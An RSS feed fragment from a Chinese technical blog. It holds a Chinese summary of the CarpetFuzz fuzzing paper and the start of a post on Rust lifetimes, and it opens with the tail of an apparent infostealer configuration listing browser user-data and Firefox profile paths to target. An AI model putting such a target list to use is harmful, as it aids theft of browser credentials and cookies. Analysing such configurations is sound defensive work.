class=&#34;attr&#34;&gt;&amp;quot;z&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;Opera Stable&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    &lt;span class=&#34;attr&#34;&gt;&amp;quot;p&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;%appdata%\\Opera Software\\Opera GX Stable&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    &lt;span class=&#34;attr&#34;&gt;&amp;quot;z&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;Opera GX Stable&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    &lt;span class=&#34;attr&#34;&gt;&amp;quot;p&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;%appdata%\\Opera Software\\Opera Neon\\User Data&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    &lt;span class=&#34;attr&#34;&gt;&amp;quot;z&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;Opera Neon&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    &lt;span class=&#34;attr&#34;&gt;&amp;quot;p&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;%localappdata%\\BraveSoftware\\Brave-Browser\\User Data&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    &lt;span class=&#34;attr&#34;&gt;&amp;quot;z&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;Brave Software&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    &lt;span class=&#34;attr&#34;&gt;&amp;quot;p&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;%localappdata%\\Comodo\\Dragon\\User Data&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    &lt;span class=&#34;attr&#34;&gt;&amp;quot;z&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;Comodo&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    &lt;span class=&#34;attr&#34;&gt;&amp;quot;p&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;%localappdata%\\CocCoc\\Browser\\User Data&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    &lt;span class=&#34;attr&#34;&gt;&amp;quot;z&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;CocCoc&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;punctuation&#34;&gt;]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;attr&#34;&gt;&amp;quot;t&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;attr&#34;&gt;&amp;quot;p&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;%appdata%\\Mozilla\\Firefox\\Profiles&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;attr&#34;&gt;&amp;quot;z&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;Mozilla Firefox&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;punctuation&#34;&gt;]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
&lt;/ul&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://cubicy.icu/carpet-fuzz/</guid>
            <title>论文精炼：CarpetFuzz</title>
            <link>http://cubicy.icu/carpet-fuzz/</link>
            <category>NLP</category>
            <category>Fuzzing</category>
            <category>AFL</category>
            <pubDate>Fri, 22 Sep 2023 19:24:29 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;论文精炼：CarpetFuzz&#34;&gt;&lt;a href=&#34;#论文精炼：CarpetFuzz&#34; class=&#34;headerlink&#34; title=&#34;论文精炼：CarpetFuzz&#34;&gt;&lt;/a&gt;论文精炼：CarpetFuzz&lt;/h1&gt;&lt;h1 id=&#34;CarpetFuzz&#34;&gt;&lt;a href=&#34;#CarpetFuzz&#34; class=&#34;headerlink&#34; title=&#34;CarpetFuzz&#34;&gt;&lt;/a&gt;CarpetFuzz&lt;/h1&gt;&lt;h2 id=&#34;Automatic-Program-Option-Constraint-Extraction-from&#34;&gt;&lt;a href=&#34;#Automatic-Program-Option-Constraint-Extraction-from&#34; class=&#34;headerlink&#34; title=&#34;Automatic Program Option Constraint Extraction from&#34;&gt;&lt;/a&gt;Automatic Program Option Constraint Extraction from&lt;/h2&gt;&lt;p&gt;Documentation for Fuzzing&lt;/p&gt;
&lt;h2 id=&#34;核心Idea&#34;&gt;&lt;a href=&#34;#核心Idea&#34; class=&#34;headerlink&#34; title=&#34;核心Idea&#34;&gt;&lt;/a&gt;核心Idea&lt;/h2&gt;&lt;p&gt;现代的大规模软件项目往往存在大量程序选项。有些漏洞需要特定参数的组合触发。然而我们不能简单地穷举这些参数的排列组合，因为这会导致工作量指数级别的膨胀。我们注意到许多参数之间存在互斥、依赖等关系，而这些关系正记录在Manual中。因此本篇文章通过NLP的手段从文档中提取参数关系并应用于Fuzzing（基于AFL）中（名为CarpetFuzz，&lt;strong&gt;开源&lt;/strong&gt;）。&lt;/p&gt;
&lt;p&gt;关键参数：&lt;/p&gt;
&lt;p&gt;参数组合准确性？Precision: 96.10%  Recall: 88.85%&lt;/p&gt;
&lt;p&gt;和暴力排列相比减少的工作量？68%&lt;/p&gt;
&lt;p&gt;和一般的Fuzz相比，额外的路径？46%&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;这篇paper是比较工程性的工作？&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;精华所在是对隐式的选项关系进行提炼，而核心思路是找到不同选项描述中结构类似的句子对，从而得出两个选项的冲突关系。&lt;/p&gt;
&lt;h2 id=&#34;行文逻辑&#34;&gt;&lt;a href=&#34;#行文逻辑&#34; class=&#34;headerlink&#34; title=&#34;行文逻辑&#34;&gt;&lt;/a&gt;行文逻辑&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;大型项目（Kernel&amp;#x2F;Apache&amp;#x2F;…）结构极其复杂，攻击面广，利用链深。人工审阅代码几乎已经不可能。&lt;strong&gt;自动化是所有软件测试方法的大势所趋，&lt;/strong&gt;包括Fuzz在内的自动化技术被官方探索应用。&lt;/li&gt;
&lt;li&gt;对于Fuzz而言，覆盖率是金标准（之一）。然而许多项目的覆盖率不够理想，文章认为其中一个原因是&lt;strong&gt;忽视了程序命令行参数&lt;/strong&gt;对程序运行的影响。某些代码块只有在特定参数组合下才存在遍历的可能。&lt;/li&gt;
&lt;li&gt;然而简单的穷举不可行：ImageMagick有242个不同的选项。参数的常见组合也许是个好想法，文章的idea则是只保留&lt;strong&gt;可行&lt;/strong&gt;组合，而非像先前的一些工作直接把参数纳入变异。&lt;/li&gt;
&lt;li&gt;难点：选项间的依赖关系在文档中以自然语言描述。Solution：&lt;strong&gt;NLP&lt;/strong&gt;&lt;ul&gt;
&lt;li&gt;刁钻的示例（强context）&lt;ul&gt;
&lt;li&gt;依赖：&lt;code&gt;-o在-g启用时将添加额外调试输出&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;冲突：&lt;code&gt;xx选项仅在正式环境中启用……要切换到正式环境请使用—release&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;NLP具体方法&#34;&gt;&lt;a href=&#34;#NLP具体方法&#34; class=&#34;headerlink&#34; title=&#34;NLP具体方法&#34;&gt;&lt;/a&gt;NLP具体方法&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;给定一个程序的文档&lt;/li&gt;
&lt;li&gt;CarpetFuzz解析“OPTIONS”部分提取出所有选项及其相应的statement&lt;/li&gt;
&lt;li&gt;CarpetFuzz使用机器学习来确定statement中是否声明了某种关系&lt;ol&gt;
&lt;li&gt;由于这样的statement在文档中占比小，文章使用基于熵的不确定性采样（主动学习），来减少人工标记训练数据的工作量。&lt;/li&gt;
&lt;li&gt;针对上述的隐晦的自然语言statement，解决方案是让CarpetFuzz总结一系列“隐含statement”的特征，并利用NLP找到满足这些特征的所有&lt;strong&gt;“sentence pairs”&lt;/strong&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;这样依赖关系就可以被确定，从而构建一个依赖树&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;CarpetFuzz正向&amp;#x2F;反向遍历依赖树中找到与关系相关的节点&lt;/strong&gt;*&lt;ol&gt;
&lt;li&gt;（说实话我没看懂这边）&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;CarpetFuzz基于语言学，利用polarity-based的有限状态机确定具体的关系&lt;/strong&gt;*&lt;ol&gt;
&lt;li&gt;(其实就是双重否定表肯定这种比较简单的状态机)&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;CarpetFuzz最终得以筛选出所有可用参数组合&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;背景工作&#34;&gt;&lt;a href=&#34;#背景工作&#34; class=&#34;headerlink&#34; title=&#34;背景工作&#34;&gt;&lt;/a&gt;背景工作&lt;/h2&gt;&lt;p&gt;&lt;img src=&#34;/carpet-fuzz/process.png&#34; alt=&#34;经典Fuzzing流程，Option预定义好并固定不参与实际执行&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;p&gt;经典Fuzzing流程，Option预定义好并固定不参与实际执行&lt;/p&gt;
&lt;h3 id=&#34;关于命令行参数相关Fuzzing的其他工作&#34;&gt;&lt;a href=&#34;#关于命令行参数相关Fuzzing的其他工作&#34; class=&#34;headerlink&#34; title=&#34;关于命令行参数相关Fuzzing的其他工作&#34;&gt;&lt;/a&gt;关于命令行参数相关Fuzzing的其他工作&lt;/h3&gt;&lt;p&gt;&lt;code&gt;AFLargv&lt;/code&gt;：限制命令行参数的数量和范围；&lt;/p&gt;
&lt;p&gt;Song等 ：通过检查参数对程序运行的影响来判断有效性；&lt;/p&gt;
&lt;p&gt;Zeller等人 ：通过特定选项解析模块推断。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;局限性：效率低&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;ConfigFuzz&lt;/code&gt; ：手动检查，需要熟悉测试的目标软件用法，对测试人员以及大规模测试是无法接受的。&lt;/p&gt;
&lt;h3 id=&#34;基于NLP的其他工作&#34;&gt;&lt;a href=&#34;#基于NLP的其他工作&#34; class=&#34;headerlink&#34; title=&#34;基于NLP的其他工作&#34;&gt;&lt;/a&gt;基于NLP的其他工作&lt;/h3&gt;&lt;p&gt;主要方向：代码注释+严格格式化文档，局限性强&lt;/p&gt;
&lt;h2 id=&#34;程序结构&#34;&gt;&lt;a href=&#34;#程序结构&#34; class=&#34;headerlink&#34; title=&#34;程序结构&#34;&gt;&lt;/a&gt;程序结构&lt;/h2&gt;&lt;p&gt;&lt;img src=&#34;/carpet-fuzz/construction.png&#34; alt=&#34;Untitled&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;p&gt;Overview of CarpetFuzz. &lt;strong&gt;EDR: explicitly declared&lt;br&gt;relationships, IDR: implicitly declared relationships.&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;R&amp;#x3D;Relationship&lt;/p&gt;
&lt;p&gt;数据集来源：&lt;code&gt;man&lt;/code&gt; 命令的说明页面&lt;/p&gt;
&lt;p&gt;拆分句子→识别包含选项关系的句子（&lt;strong&gt;R句子&lt;/strong&gt;）&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;关系：冲突、依赖、（蕴含、相似和取代 &amp;#x3D;冲突，因为复用不能有效增加覆盖率）&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/carpet-fuzz/sentence-search.png&#34; alt=&#34;寻找R句子&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;p&gt;寻找R句子&lt;/p&gt;
&lt;p&gt;添加主语是为了避免NLP的解析错误。&lt;/p&gt;
&lt;p&gt;还有一个预处理是把选项名字替换为自定义标识符以免干扰分析（这怎么发现的？）。&lt;/p&gt;
&lt;p&gt;某个选项的关键是&lt;strong&gt;谓词（效果）与目标（作用对象）&lt;/strong&gt;。&lt;/p&gt;
&lt;h3 id=&#34;隐式的冲突参数&#34;&gt;&lt;a href=&#34;#隐式的冲突参数&#34; class=&#34;headerlink&#34; title=&#34;隐式的冲突参数&#34;&gt;&lt;/a&gt;隐式的冲突参数&lt;/h3&gt;&lt;p&gt;实际上，&lt;strong&gt;隐式的描述语句只涉及冲突：例如，-B和-L选项的描述分别是“Force output to be written with Big-Endian byte order”和“Force output to be written with Little-Endian byte order”&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;那么这些句子的语法树结构是相同的。因此这些“sentence pairs”很关键，需要被提取识别。&lt;/p&gt;
&lt;p&gt;同时还有一些常见的冲突写法，例如用&lt;code&gt;|&lt;/code&gt; 分隔。当然这也可能是别名，具体看描述句子中是“这些参数”还是“这个参数”来确定到底是别名还是一些冲突的参数。&lt;/p&gt;
&lt;h3 id=&#34;极性分析&#34;&gt;&lt;a href=&#34;#极性分析&#34; class=&#34;headerlink&#34; title=&#34;极性分析&#34;&gt;&lt;/a&gt;极性分析&lt;/h3&gt;&lt;p&gt;情感分析常用，这里用来解析参数之间的冲突&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/carpet-fuzz/nlp.png&#34; alt=&#34;Untitled&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;p&gt;例如主语A对(B&amp;amp;C)呈现negative的极性，我们就可以认为A不能与B&amp;#x2F;C一起使用。&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/JackKuo666/NLP_basis/blob/master/%E7%AC%AC%E5%9B%9B%E7%AB%A0%EF%BC%9A%E4%BE%9D%E5%AD%98%E5%8F%A5%E6%B3%95%E5%92%8C%E8%AF%AD%E4%B9%89%E4%BE%9D%E5%AD%98%E5%88%86%E6%9E%90.md&#34;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;aside&gt;
💡 个人认为这个做法效果不错的原因可能是文章提到的&#34;combine with&#34;、&#34;imply&#34;、&#34;like&#34;、&#34;ignore”这些关键词，技术文档的语法还是相对好分析的，对复杂的语句可能会有问题。
所以如果把软件技术讨论社区的相关博文丢进大模型是不是会有更丰富的信息蒸馏出来？

&lt;/aside&gt;

&lt;p&gt;神经网络实现的分类器来判断一个句子有多大可能是R句子。准确率是比较高的，但召回率比我想的多。&lt;/p&gt;
&lt;h2 id=&#34;实际测试&#34;&gt;&lt;a href=&#34;#实际测试&#34; class=&#34;headerlink&#34; title=&#34;实际测试&#34;&gt;&lt;/a&gt;实际测试&lt;/h2&gt;&lt;p&gt;文章首先认为参数数量超过一定数量没有实际意义（大部分生产环境下也用不到更多的）。测试也表明基本上超过6个参数就很难有新的发现。所以使用6-wise&lt;/p&gt;
&lt;p&gt;为了找到更有价值的参数组合，测试器会关注参数的变化能够引导出多少新的代码路径覆盖率；对于太低价值的组合会逐渐被剪枝掉。&lt;/p&gt;
&lt;p&gt;那这边实际上是Song.的工作的Idea了。&lt;/p&gt;
&lt;h2 id=&#34;杂项&#34;&gt;&lt;a href=&#34;#杂项&#34; class=&#34;headerlink&#34; title=&#34;杂项&#34;&gt;&lt;/a&gt;杂项&lt;/h2&gt;&lt;p&gt;剩下的主要是一些对实现细节（例如模型超参数、预处理工作）的一些描述。&lt;/p&gt;
&lt;p&gt;然后还有就是有效性度量，主要是准确率和性能速度。&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Q1. CarpetFuzz的性能如何？&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Q2. 关系识别的准确性如何？（那必须好）&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Q3. 关系提取的准确性如何？（那必须好）&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;**Q4. CarpetFuzz的优先级排序技术的有效性如何？&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	“结果显示，相比随机抽样，我们的剪枝技术可以减少更多组合（&lt;span class=&#34;number&#34;&gt;98.91&lt;/span&gt;%），&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;同时仅略微损失边的覆盖率（&lt;span class=&#34;number&#34;&gt;2.54&lt;/span&gt;%）”**&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Q5. 与最先进技术相比，CarpetFuzz的模糊测试性能如何？（那必须好，因为前人的工作看起来确实比较粗糙）&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Q6. CarpetFuzz能否发现真实世界的漏洞？（事实证明可以）&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;在5次48h的fuzzing中，&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;结果显示，平均有94.59%的CarpetFuzz的唯一边没有被其他模糊器发现，CarpetFuzz平均能够帮助AFL发现多出45.97%的边。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;边指的是构成代码路径的jmp之类的跳转？&lt;/p&gt;
&lt;p&gt;“唯一边”这个性能指标确实可以展示其能发现新的未被探索过的代码路径。&lt;/p&gt;
&lt;p&gt;Real-world测试也发现了很多特殊的crash，然后搞到43个0day&lt;/p&gt;
&lt;h2 id=&#34;局限性&#34;&gt;&lt;a href=&#34;#局限性&#34; class=&#34;headerlink&#34; title=&#34;局限性&#34;&gt;&lt;/a&gt;局限性&lt;/h2&gt;&lt;p&gt;这篇文章也指出局限性主要来自NLP模型的准确率问题（猜到了）。不过好在这基本只会导致跑太多无效的测试，并不怎么漏报。&lt;/p&gt;
&lt;p&gt;还有一个问题是缺乏人类常识，例如他不知道水平和垂直是反义词。解决方案是知识图谱（是否有点太古典机器学习了）&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;我怎么觉得这俩问题都是大语言模型最擅长的？&lt;/strong&gt;&lt;/p&gt;
&lt;h2 id=&#34;文章总结&#34;&gt;&lt;a href=&#34;#文章总结&#34; class=&#34;headerlink&#34; title=&#34;文章总结&#34;&gt;&lt;/a&gt;文章总结&lt;/h2&gt;&lt;p&gt;原文摘抄如下：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;我们设计并实现了CarpetFuzz，一种基于自然语言处理的模糊测试辅助技术，用于提取程序选项约束。通过采用主动学习、机器学习和自然语言处理技术，CarpetFuzz能够准确地从文档中提取选项之间的关系，并过滤掉67.91%的组合选项。借助经过修剪的有效组合，CarpetFuzz帮助AFL在20个常用程序中找到了其他模糊器无法发现的路径的增加了45.97%，并发现了57个独特的崩溃，其中30个被分配了CVE ID。此外，CarpetFuzz在之前的基准测试中发现了94个独特的崩溃，是之前工作的1.71倍。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;感谢您的阅读🙂&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://cubicy.icu/2023/09/05/rust-lifetime/</guid>
            <title>Rust类型系统中的生命周期</title>
            <link>http://cubicy.icu/2023/09/05/rust-lifetime/</link>
            <category>Rust</category>
            <category>Lifetime</category>
            <category>Code</category>
            <category>Programming</category>
            <pubDate>Tue, 05 Sep 2023 00:14:45 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;Rust类型系统中的生命周期&#34;&gt;&lt;a href=&#34;#Rust类型系统中的生命周期&#34; class=&#34;headerlink&#34; title=&#34;Rust类型系统中的生命周期&#34;&gt;&lt;/a&gt;Rust类型系统中的生命周期&lt;/h1&gt;&lt;p&gt;&lt;em&gt;[2024-04-11 更新] 修正了一些错误，采纳了一些读者反馈可以增加的解释，在此表示感谢。&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;Rust的生命周期应被视为类型系统的一部分。这是我的粗浅理解，理解错误难免，若发现恳请斧正！&lt;br&gt;以下几节试图渐进地、但从不同角度理解该问题；只要看懂一节也许就足够了，所以可以都看看？&lt;br&gt;&lt;strong&gt;提示：如果您有函数式编程基础，这篇文章看起来会很幼稚。“不就是一堆monad吗？”&lt;/strong&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;一开始看到生命周期和泛型写在一起也许会感到诧异：但事实上生命周期就是类型系统的一部分，泛型指明某一值能进行什么运算，生命周期指明某一值在什么区间内才有效、才可以参与运算。既然能接受泛型加入类型系统并参与类型的运算，生命周期也应同理。&lt;br&gt;贴段代码大伙大概感受一下：&lt;/p&gt;
&lt;figure class=&#34;highlight rust&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;use&lt;/span&gt; std::fmt::Display;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;fn&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;longest_with_an_announcement&lt;/span&gt;&amp;lt;&lt;span class=&#34;symbol&#34;&gt;&amp;#x27;a&lt;/span&gt;, T&amp;gt;(x: &amp;amp;&lt;span class=&#34;symbol&#34;&gt;&amp;#x27;a&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;str&lt;/span&gt;, y: &amp;amp;&lt;span class=&#34;symbol&#34;&gt;&amp;#x27;a&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;str&lt;/span&gt;, ann: T) &lt;span class=&#34;punctuation&#34;&gt;-&amp;gt;&lt;/span&gt; &amp;amp;&lt;span class=&#34;symbol&#34;&gt;&amp;#x27;a&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;str&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;where&lt;/span&gt; T: Display&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span 